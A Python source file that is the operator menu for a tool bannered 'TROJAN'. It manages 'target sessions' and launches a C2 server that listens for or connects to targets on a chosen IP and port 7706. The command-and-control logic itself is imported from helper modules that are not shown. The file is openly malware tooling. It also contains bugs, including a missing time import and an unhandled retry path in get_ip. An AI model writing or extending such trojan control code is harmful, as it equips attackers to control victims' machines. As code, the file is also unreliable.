
from helper.C2 import C2Server
from helper.session import Session
import os


class main(Session):
    def __init__(self):
        super().__init__()
        self.print_banner()
        self.options()
        selected = input("Enter option: ").strip()
        self.run(selected)

    def print_banner(self) -> None:
        print(
            """
        ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
        ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
            ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
            ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
            ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
            ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
            by Zohaib Ud Din
            """
        )

    def options(self):
        options = {
            "0":"Exit",
            "1": "List of targets sessions",
            "2": "Refresh targets sessions list",
            "3": "Create new target session",
        }
        print("select option: ")
        for key, value in options.items():
            print(f"{key}: {value}")

    def run(self, selected):
        if selected == "0":
            self.exit()
        if selected == "1":
            self.getSessions()
            selected = input("Enter option: ").strip()
            session_data = self.loadSession(selected)
            if session_data is None:
                self.getSessions()
                print("Invalid option")
                selected = input("Enter option: ").strip()
                session_data = self.loadSession(selected)
                self.start(session_data[-1])
            else:
                self.start(session_data[-1])
        else:
            self.options()
            print("Invalid option")
            selected = input("Enter option: ").strip()
            self.run(selected)


    def get_ip(self, session_data):
        ip_options = {
            "0": "Exit",
            "1": f"Localhost ({session_data['local_ip']})",
            "2": f"Public IP ({session_data['ip']})",
            "3": "Use IP 0.0.0.0",
        }
        print("select ip option: ")
        for key, value in ip_options.items():
            print(f"{key}: {value}")
        selected_ipo = input("Enter ip option: ").strip()

        if selected_ipo == "2":
            ip = session_data['ip']
        elif selected_ipo == "1":
            ip = session_data['local_ip']
        elif selected_ipo == "3":
            ip = "0.0.0.0"
        else:
            self.get_ip(session_data)
       
        return ip

    def get_port(self):
        options = {
            "0": "Exit",
            "1": "Use default port (7706)",
            "2": "Use custom port",
        }

        print("select port option: ")
        for key, value in options.items():
            print(f"{key}: {value}")
        selected_port = input("Enter port option: ").strip()

        if selected_port == "2":
            port = input("Enter port: ").strip()
        else:
            port = "7706"
        return port

    def start(self, session_data):
        while True:  # Auto-restart loop
            try:
                ip = self.get_ip(session_data)
                port = self.get_port()
                
                options = {
                    "0": "Exit",
                    "1": "Listen C2 server", 
                    "2": "Send C2 server",
                }
                print("\n" + "="*50)
                print("C2 CONTROL PANEL")
                for key, value in options.items():
                    print(f"{key}: {value}")
                print("="*50)

                selected = input("Enter C2 option: ").strip()

                if selected == "0":
                    self.exit()
                    return  # Permanent exit

                elif selected == "1":
                    print(f"\n[*] Starting SERVER on {ip}:{port}")
                    self.c2 = C2Server()
                    self.c2.host = ip
                    self.c2.port = int(port)
                    server = self.c2.listen()
                    self.c2.receiver(server)

                elif selected == "2":
                    print(f"\n[*] Starting CLIENT to {ip}:{port}")
                    self.c2 = C2Server()
                    self.c2.target = ip
                    self.c2.port = int(port)
                    client_socket = self.c2.send()
                    self.c2.sender(client_socket)

                else:
                    print("❌ Invalid option! Try again.")
                    continue

            except KeyboardInterrupt:
                print("\n[*] Interrupted - returning to menu...")
                continue
                
            except Exception as e:
                print(f"\n❌ CRITICAL ERROR: {e}")
                print("🔄 Auto-restarting to IP selection...")
                time.sleep(2)
                continue  # Restart from IP selection

    def exit(self):
        print("[!] Exiting...")
        os._exit(0)



if __name__ == "__main__":
    main()